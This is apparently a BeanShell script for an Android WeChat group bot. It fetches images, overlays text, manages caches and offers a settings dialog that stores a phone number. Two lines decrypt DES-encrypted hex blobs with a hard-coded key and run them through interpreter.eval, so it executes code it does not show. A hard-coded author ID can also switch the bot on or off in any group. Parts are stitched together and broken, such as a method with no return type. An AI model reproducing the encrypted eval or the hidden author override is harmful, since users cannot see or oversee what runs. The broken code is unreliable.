public static HashMap 地图=new HashMap();
public class 检查
{
	String 名称;
	JSONArray 数组;
	JSONArray 数据=new JSONArray();
	long 时间;
	int 数量;
}
public static String FileFormatConversion(long sizeInBytes){
double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
DecimalFormat decimalFormat=new DecimalFormat("#.###");
if (sizeInKB < 1024) {
return decimalFormat.format(sizeInKB) + "KB";
} else if (sizeInKB < 1024 * 1024) {
double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
return decimalFormat.format(sizeInMB) + "MB";
} else {
double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
return decimalFormat.format(sizeInGB) + "GB";
}
}
int 选择=0;
public void 存(String a,String b,String c){
putString(a,b,c);
}
public String 取(String a,String b){
return getString(a,b,"");
}
boolean flag=false;
public List list=new ArrayList();
public static void DetectPic(){
try{
File dir = new File(JavaPath+"/图片/");
if(!dir.exists()){
 dir.mkdirs();
Downloadpic(-1);
}else{
for(int i=0;i<10;i++){
String fi=JavaPath+"/图片/图片"+i+".jpg";
File di = new File(fi);
if(!di.exists()){
Downloadpic(i);
if(list.contains(fi)){
list.remove(fi);
}}}
}
}catch(Exception e){
e.printStackTrace();
}
}

public static void Downloadpic(int j){
String url="https://t.mwm.moe/mp";
if(j==-1){
flag=true;
Toast("正在缓存,请稍后");
for(int i=0;i<10;i++){
try {
xz(url,JavaPath+"/图片/图片"+i+".jpg");
} catch (Exception e) {
e.printStackTrace();
}}
flag=false;
Toast("缓存成功");
}else{
try {
xz(url,JavaPath+"/图片/图片"+j+".jpg");
} catch (Exception e) {
e.printStackTrace();
}}
}

public static void getData(String qun,String text){
if(flag){sendMsg(qun,text);Toast("图片缓存中，自动切换文字发送");return;}
int num=(int)(Math.random()*10);
String fi=JavaPath+"/图片/图片"+num+".jpg";

while(!new File(fi).exists()){
DetectPic();
num=(int)(Math.random()*10);
fi=JavaPath+"/图片/图片"+num+".jpg";
}
if(!list.contains(fi)){
sendPic(qun,MakeTextPhoto(text,num));
delAllFile(new File(fi),1);
list.add(fi);
DetectPic();
}else{
Toast("太快了,请慢点");
getData(qun,text);
}
}

public static String fetchRedirectUrl(String url){
        try {
            // 创建一个URL对象
            URL imageUrl=new URL(url);
            // 打开一个HTTP连接
            HttpURLConnection connection=(HttpURLConnection) imageUrl.openConnection();
            // 设置请求方法为GET
            connection.setRequestMethod("GET");
            String redirectUrl=connection.getHeaderField("Location");
            // 关闭连接
            connection.disconnect();
            // 返回重定向链接
            return redirectUrl;
        } catch (Exception e) {
            // 处理异常
            e.printStackTrace();
            // 返回空字符串
            return "";
        }
}
public static void xz(String url,String filepath) throws Exception{
        InputStream input = null;
        try {
            URL urlsssss = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
            input = urlConn.getInputStream();
            byte[] bs = new byte[1024];
            int len;
            FileOutputStream out = new FileOutputStream(filepath, false);
            while((len = input.read(bs)) != -1)
            {
                out.write(bs, 0, len);
            }
            out.close();
            input.close();

        } catch (IOException e) {
            return;
        }
        finally {
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return;
}
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import java.util.Base64;
import java.net.URLEncoder;
import java.net.URLDecoder;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import org.junit.jupiter.api.Test;
public final class EncryptUtil
{
    private final static String DES = "DES";
    public static String decrypt(String src, String key)
    {
        try
        {
            return new String(decrypt(hex2byte(src.getBytes()), key.getBytes()));
        }
        catch (Exception e)
        {}
        return null;
    }
    public static String encrypt(String src, String key)
    {
        try
        {
            return byte2hex(encrypt(src.getBytes(), key.getBytes()));
        }
        catch (Exception e)
        {}
        return null;
    }
    private static byte[] decrypt(byte[] src, byte[] key) throws Exception
    {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(key);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance(DES);
        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
        return cipher.doFinal(src);
    }
    private static byte[] hex2byte(byte[] b)
    {
        if((b.length % 2) != 0) throw new IllegalArgumentException("长度不是偶数");
        byte[] b2 = new byte[b.length / 2];
        for(int n = 0; n < b.length; n += 2)
        {
            String item = new String(b, n, 2);
            b2[n / 2] = (byte) Integer.parseInt(item, 16);
        }
        return b2;
    }
    private static String byte2hex(byte[] b)
    {
        String hs = "";
        String stmp = "";
        for(int n = 0; n < b.length; n++)
        {
            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
            if(stmp.length() == 1) hs = hs + "0" + stmp;
            else hs = hs + stmp;
        }
        return hs.toUpperCase();
    }
}
public static GG(String nr, String key)
{
    SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
    Cipher cipher = Cipher.getInstance("AES");
    cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
    byte[] decodedBytes = Base64.getDecoder().decode(nr);
    byte[] decryptedBytes = cipher.doFinal(decodedBytes);
    return new String(decryptedBytes, StandardCharsets.UTF_8);
}
this.interpreter.eval(EncryptUtil.decrypt("9C15A243E4CB5EBE8E8D2738AD5C5EE61A7B68D09CFD5533C1B2CDCCCF268B5CA39AC462AA2C98501F63B054239E8DF4D919F0D0796ADDBDEAA338D80ABD583F1A07DE5DE0BB4432397E947D8B8D1B3A31F2E0156239C235","SecretKey"),"eval stream");

import android.media.MediaPlayer;
private MediaPlayer mediaPlayer;

    public void 提示音(String filePath) {
        if (mediaPlayer != null) {
            // 如果MediaPlayer正在播放，先停止并释放资源
            mediaPlayer.release();
        }

        // 创建新的MediaPlayer对象
        mediaPlayer = new MediaPlayer();
        try {
            File file = new File(filePath);
            mediaPlayer.setDataSource(file.getPath());
            mediaPlayer.setLooping(false);
            mediaPlayer.prepare(); // 可以使用prepareAsync进行异步准备
            mediaPlayer.start();
        } catch (Exception e) {
            e.printStackTrace();
            // 发生异常时，释放MediaPlayer资源
            mediaPlayer.pause();
            mediaPlayer.release();
            mediaPlayer = null;
        }
    }

public void release() {
        if (mediaPlayer != null) {
        	mediaPlayer.pause();
            mediaPlayer.release();
            mediaPlayer = null;
        }
}

this.interpreter.eval(EncryptUtil.decrypt("F2D1EB21A9DB1E2E41DB73BACC07FCE089019C504F9227D12F23F29B94100176E817A88B66C89A9B7B4B4D52A556664189019C504F9227D14D707CC14B0BCF2E3234EDD8973424195DE71F95DA7545A950FE72678C27443F2825557F4AAF2CDA104C857DDA5A5B2F99BCFE38ED9C5DB29BAD2EBD4BE0F8409D304B6928C2D67232990F04E581AABC0A8656589D2ECDB5B1A013693705E5027CF3597D085C436F0AD9865A4F44F2128193CC37D05D4ECF4467FFCB1512F3661B76496F3EF710E2C1B35055566E6EBF","SecretKey"),"eval stream");

import android.graphics.*;
public static String MakeTextPhoto(String text,int num){
String textface=JavaPath+"/云上升/字体.ttf";
Object typeface;
try{typeface=Typeface.createFromFile(textface);}
catch(e){typeface=Typeface.DEFAULT_BOLD;}
text=text.replace("[]","");
String[] word=text.split("\n");

float textsize=100.0f;
float padding=80.0f;

Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);


paint.setTypeface(typeface);
paint.setTextSize(textsize);
Bitmap mybitmap;
mybitmap=BitmapFactory.decodeFile(JavaPath+"/图片/图片"+num+".jpg");
float text_width=0;
float average_width=0;
float text_height=0; 
String newword="";
for(String line:word){
average_width +=paint.measureText(line);}
average_width=average_width/word.length;

for(String line:word){
float width=paint.measureText(line);
if(width-average_width>700){
int rr=Math.ceil(width/average_width);
int cut=Math.ceil(line.length()/rr);

line=splitString(line,cut);
for(String newl:line.split("\n")){
width=paint.measureText(newl);
if(text_width<width) text_width=width;}}
if(text_width<width) text_width=width;
newword+=line+"\n";}
word=newword.split("\n");

int width=(int)(text_width + padding * 2f);
int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);


Canvas canvas=new Canvas(original);
Matrix matrix = new Matrix();

float i=(float)width/(float)mybitmap.getWidth();
float b=(float)heigth/(float)mybitmap.getHeight();
if(i>b) b=i;
//if(i<b) b=i;
matrix.postScale(b,b); //长和宽放大缩小的比例
Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
canvas.drawColor(Color.parseColor("#5AFFFFFF"));//白色半透明遮罩


float yoffset=textsize+padding;
String[] colors = {"随机"};
//字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机
for(int i=0; i<word.length;i++){
paint.setColor(getColor(colors[i%colors.length]));
canvas.drawText(word[i],padding,yoffset,paint);
yoffset+=textsize+8;
}

String path=JavaPath+"/缓存/"+canvas+".png";
File end=new File(path);
if(!end.exists()) end.getParentFile().mkdirs();
FileOutputStream out=new FileOutputStream(end);
original.compress(Bitmap.CompressFormat.JPEG, 100, out);
out.close();
return path;
}
private static String randomColor(int len){
	try{
		StringBuffer result=new StringBuffer();
			for (int i=0; i < len; i++){
				result.append(Integer.toHexString(new Random().nextInt(16)));
			}
			return result.toString().toUpperCase();
		}catch (Exception e){
			return "00CCCC";
		}
	};
public static int getColor(String color)
{
	switch(color)
	{
		case "红色":
			return Color.RED;
		case "黑色":
			return Color.BLACK;
		case "蓝色":
			return Color.BLUE;
		case "蓝绿":
			return Color.CYAN;
		case "白灰":
			return Color.LTGRAY;
		case "灰色":
			return Color.GRAY;
		case "绿色":
			return Color.GREEN;
		case "深灰":
			return Color.DKGRAY;
		case "洋红":
			return Color.MAGENTA;
		case "透明":
			return Color.TRANSPARENT;
		case "白色":
			return Color.WHITE;
		case "黄色":
			return Color.YELLOW;
		case "随机":
			return Color.parseColor("#"+randomColor(6));
		default:
			return Color.parseColor("#"+color);
	}
};
public Object ParseColor(String color,Object normal)
{
Object parsecolor;
try{
if(color.contains("随机")) parsecolor=Color.parseColor(randomColor(6));
else parsecolor=Color.parseColor(color);
}
catch(e){parsecolor=normal;}
return parsecolor;
}
public String splitString(String content, int len)
{
	String tmp="";
	if(len > 0){
	if(content.length() > len){
	int rows=Math.ceil(content.length() / len);
	for (int i=0; i < rows; i++){
	if(i == rows - 1){
	tmp += content.substring(i * len);}else{
	tmp += content.substring(i * len, i * len + len) + "\n ";}}}else{
	tmp=content;}}return tmp;
}

//获取目录大小
import java.text.DecimalFormat;
public static String getFormattedSize(File folder){
if (folder == null || !folder.exists()) {
return "文件夹不存在或为空";
}
long sizeInBytes=getFolderSize(folder);
double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
DecimalFormat decimalFormat=new DecimalFormat("#.###");
if (sizeInKB < 1024) {
return decimalFormat.format(sizeInKB) + "KB";
} else if (sizeInKB < 1024 * 1024) {
double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
return decimalFormat.format(sizeInMB) + "MB";
} else {
double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
return decimalFormat.format(sizeInGB) + "GB";
}}
public static long getFolderSize(File folder){
long size=0;
File[] files=folder.listFiles();
if (files != null) {
for (File file : files) {
if (file.isFile()) {
size += file.length();
} else if (file.isDirectory()) {
size += getFolderSize(file);
}
}
}
return size;
}
//加载删除缓存
public static void delAllFile(File directory,int type){
if(!directory.exists()) return;
String text="删除";
    if (!directory.isDirectory()){
    text+="\n文件"+directory.getAbsolutePath();
        directory.delete();
    } else{
        File [] files=directory.listFiles();

        // 空文件夹
        if (type==0&&files.length==0){
           directory.delete();
          text+="\n空文件夹"+directory.getAbsolutePath();
            return;
        }

        // 删除子文件夹和子文件
        for (File file : files){
            if (file.isDirectory()){
                delAllFile(file,type);
            } else {
                file.delete();
                text+="\n文件"+file.getAbsolutePath();
            }
        }

        // 删除文件夹本身
        if(type==0){
        directory.delete();
      text+="\n文件夹" + directory.getAbsolutePath();
      }
    }
}
delAllFile(new File(JavaPath+"/缓存"),0);
public static String u加(String str) {
String r="";
for (int i=0; i < str.length(); i++) {
int chr1=(char) str.charAt(i);
String x=""+Integer.toHexString(chr1);
if(x.length()==1)r+= "\\u000"+x;
if(x.length()==2)r+= "\\u00"+x;
if(x.length()==3)r+= "\\u0"+x;
if(x.length()==4)r+= "\\u"+x;
}
return r;
}

public static String u解(String unicode) {
StringBuffer string = new StringBuffer();
String[] hex = unicode.split("\\\\u");
        for (int i = 0; i < hex.length; i++) {

            try {
                if(hex[i].length()>=4){
                    String chinese = hex[i].substring(0, 4);
                    try {
                        int chr = Integer.parseInt(chinese, 16);
                        boolean isChinese = isChinese((char) chr);
                            string.append((char) chr);
                            String behindString = hex[i].substring(4);
                            string.append(behindString);
                    } catch (NumberFormatException e1) {
                        string.append(hex[i]);
                    }

                }else{
                    string.append(hex[i]);
                }
            } catch (NumberFormatException e) {
                string.append(hex[i]);
            }
        }

return string.toString();
}
public static boolean isChinese(char c) {
        Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);
        if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS
                || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS
                || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A
                || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION
                || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION
                || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {
            return true;
        }
        return false;
}
import android.os.Handler;
import android.os.Looper;
public void onMsg(Object data){
String text=data.content;
String qun=data.talker;
String wxid=data.sendTalker;
if(data.isText()){
if(wxid.equals(AuthorWxid)||!qun.equals(WhiteList)){
if(wxid.equals(AuthorWxid)&&!mWxid.equals(AuthorWxid)){
if(text.equals("一键开机")||text.equals("一键开启")){
	if("1".equals(getString(qun,"开关",""))){
	sendMsg(qun,"已经开机了");
	}else{
	putString(qun,"开关","1");
	sendMsg(qun,"开机成功");
	}
}
if(text.equals("一键关机")||text.equals("一键关闭")){
	if("1".equals(getString(qun,"开关",""))){
	putString(qun,"开关",null);
	sendMsg(qun,"关机成功");
	}
}
if(text.contains("@"+getName(mWxid)+" ")&&text.contains("开机"))
{
	if("1".equals(getString(qun,"开关",""))){
	sendMsg(qun,"已经开机了");
	}else{
	putString(qun,"开关","1");
	sendMsg(qun,"开机成功");
	}
}
if(text.contains("@"+getName(mWxid)+" ")&&text.contains("关机"))
{
	if("1".equals(getString(qun,"开关",""))){
	putString(qun,"开关",null);
	sendMsg(qun,"关机成功");
	}
}
}
if(mWxid.equals(wxid)){
if(text.equals("开机")||text.equals("开启")){
	if("1".equals(getString(qun,"开关",""))){
	sendMsg(qun,"已经开机了");
	}else{
	putString(qun,"开关","1");
	sendMsg(qun,"开机成功");
	}
}
if(text.equals("关机")||text.equals("关闭")){
	if("1".equals(getString(qun,"开关",""))){
	putString(qun,"开关",null);
	sendMsg(qun,"关机成功");
	}
}
if(text.equals("开关设置")||text.equals("设置开关")){
	开关设置(qun);
	recallMsg(data.msgId);
}
if(text.equals("配置设置")||text.equals("设置配置")){
	配置设置(qun);
	recallMsg(data.msgId);
}
}
}
if("1".equals(getString(qun,"开关",""))){菜单(data);}
}
if("1".equals(getString(qun,"开关",""))){进群(data);
if("1".equals(getString(qun,"自身撤回",""))){
    int 撤回时间 = 30;
    if(getInt(qun,"撤回时间",0) != null){
        撤回时间 = getInt(qun,"撤回时间",30);
    }
    Handler handler = new Handler(Looper.getMainLooper());
    handler.postDelayed(new Runnable() {
        public void run() {
            if(wxid.equals(mWxid)){
                recallMsg(data.msgId);
            }
        }
    }, 撤回时间 * 1000); // 延迟撤回时间
}
}
}


public void 配置设置(String qun){
Activity ThisActivity=getActivity();
boolean 底部时间=true;
boolean 底部文案=true;
boolean 底部尾巴=true;

if(!取("开关","底部时间").equals("1")){底部时间=false;}
if(!取("开关","底部文案").equals("1")){底部文案=false;}
if(!取("开关","底部尾巴").equals("1")){底部尾巴=false;}
ThisActivity.runOnUiThread(new Runnable()
{
public void run()
{
//主题风格
AlertDialog.Builder tx=new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
String[] ww={"底部时间","底部文案","底部尾巴"};
boolean[] xx={底部时间,底部文案,底部尾巴};
//相关名字
TextView tc = new TextView(ThisActivity);
tc.setText(Html.fromHtml("<font color=\"#D0ACFF\">菜单名字</font>"));
tc.setTextSize(20);
TextView tc1 = new TextView(ThisActivity);
tc1.setText(Html.fromHtml("<font color=\"#71CAF8\">触发指令</font>"));
tc1.setTextSize(20);
TextView tc2 = new TextView(ThisActivity);
tc2.setText(Html.fromHtml("<font color=\"#21E9FF\">发送模式</font>"));
tc2.setTextSize(20);
TextView tc3 = new TextView(ThisActivity);
tc3.setText(Html.fromHtml("<font color=\"#E09C4F\">手机号码</font>"));
tc3.setTextSize(20);

final EditText editText = new EditText(ThisActivity);
editText.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
//检测到换行就自动切换下一行
editText.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
editText.addTextChangedListener(new TextWatcher(){
//更改前
public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2){}
//更改后
public void onTextChanged(CharSequence charSequence,int i,int i1,int i2){}
public void afterTextChanged(Editable editable){
//获取当前输入内容的长度
int inputLength = editable.length();
//字符串不能大于15
if (inputLength>15){
String limitedText = editable.toString().substring(0,15);
editText.setText(limitedText);
editText.setSelection(limitedText.length());
}
}
});
editText.setText(取("开关","菜单名字"));

final EditText editText1=new EditText(ThisActivity);
editText1.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认</font>"));
//检测到换行就自动切换下一行
editText1.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
editText1.addTextChangedListener(new TextWatcher(){
public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2){}
public void onTextChanged(CharSequence charSequence,int i,int i1,int i2){}
public void afterTextChanged(Editable editable){
//获取当前输入内容的长度
int inputLength = editable.length();
if (inputLength>10){
String limitedText = editable.toString().substring(0,10);
editText1.setText(limitedText);
editText1.setSelection(limitedText.length());
}
}
});
editText1.setText(取("开关","触发指令"));


final EditText editText2=new EditText(ThisActivity);
editText2.setHint(Html.fromHtml("<font color=\"#A2A2A2\">不填则默认文字 1图片</font>"));

//检测到换行就自动切换下一行
editText2.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
//只包含数字
editText2.setInputType(InputType.TYPE_CLASS_NUMBER);
//添加文本变化监听器
editText2.addTextChangedListener(new TextWatcher(){
public void beforeTextChanged(CharSequence s,int start,int count,int after){}
public void onTextChanged(CharSequence s,int start,int before,int count){
if(!s.toString().matches("[1]")) {
editText2.getText().delete(editText2.length()-1, editText2.length());
}
}
public void afterTextChanged(Editable s){}
});
editText2.setText(取(qun,"发送模式"));

final EditText editText3=new EditText(ThisActivity);
editText3.setHint(Html.fromHtml("<font color=\"#A2A2A2\">请输入手机号码</font>"));
//检测到换行就自动切换下一行
editText3.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
editText3.setInputType(InputType.TYPE_CLASS_NUMBER);
editText3.addTextChangedListener(new TextWatcher(){
public void beforeTextChanged(CharSequence charSequence,int i,int i1,int i2){}
public void onTextChanged(CharSequence charSequence,int i,int i1,int i2){}
public void afterTextChanged(Editable editable){
//获取当前输入内容的长度
int inputLength = editable.length();
if (inputLength>11){
String limitedText = editable.toString().substring(0,11);
editText3.setText(limitedText);
editText3.setSelection(limitedText.length());
}
}
});
String phoneNumber=取("开关","手机号码");
if (phoneNumber.length() > 7) {
phoneNumber=phoneNumber.substring(0,3)+"******"+phoneNumber.substring(9);
}
editText3.setText(phoneNumber);


LinearLayout cy=new LinearLayout(ThisActivity);
cy.setOrientation(LinearLayout.VERTICAL);
//添加进弹窗
cy.addView(tc);
cy.addView(editText);
cy.addView(tc1);
cy.addView(editText1);
cy.addView(tc2);
cy.addView(editText2);
cy.addView(tc3);
cy.addView(editText3);
tx.setTitle(Html.fromHtml("<font color=\"red\">配置设置</font>"));
tx.setView(cy);
tx.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">确认</font>"),new DialogInterface.OnClickListener()
{
public void onClick(DialogInterface dialogInterface,int i)
{
String tx=editText.getText().toString();
String tx1=editText1.getText().toString();
String tx2=editText2.getText().toString();
String tx3=editText3.getText().toString();
boolean[] cs=xx;
if(cs[0]){存("开关", "底部时间","1");}else{存("开关", "底部时间",null);}
if(cs[1]){存("开关", "底部文案","1");}else{存("开关", "底部文案",null);}
if(cs[2]){存("开关", "底部尾巴","1");}else{存("开关", "底部尾巴",null);}
if(!tx3.equals("")){
if(!tx3.contains("*")){
存("开关","手机号码",tx3);}
}else{存("开关","手机号码",null);}
if(!tx2.equals("")){
存(qun,"发送模式",tx2);
}else{存(qun,"发送模式",null);}
if(!tx1.equals("")){
存("开关","触发指令",tx1);
}else{存("开关","触发指令",null);}
if(!tx.equals("")){
存("开关","菜单名字",tx);
}else{存("开关","菜单名字",null);}
Toast("设置成功");
}
});
tx.setNegativeButton(Html.fromHtml("<font color=\"#E3319D\">取消</font>"),new DialogInterface.OnClickListener()
{
public void onClick(DialogInterface dialogInterface,int i)
{
//取消
}
});
tx.setMultiChoiceItems(ww,xx,new DialogInterface.OnMultiChoiceClickListener(){
public void onClick(DialogInterface dialogInterface,int which,boolean isChecked){
xx[which]=isChecked;
}});
//点空白处无法取消
tx.setCancelable(false);
tx.show();
}
});
}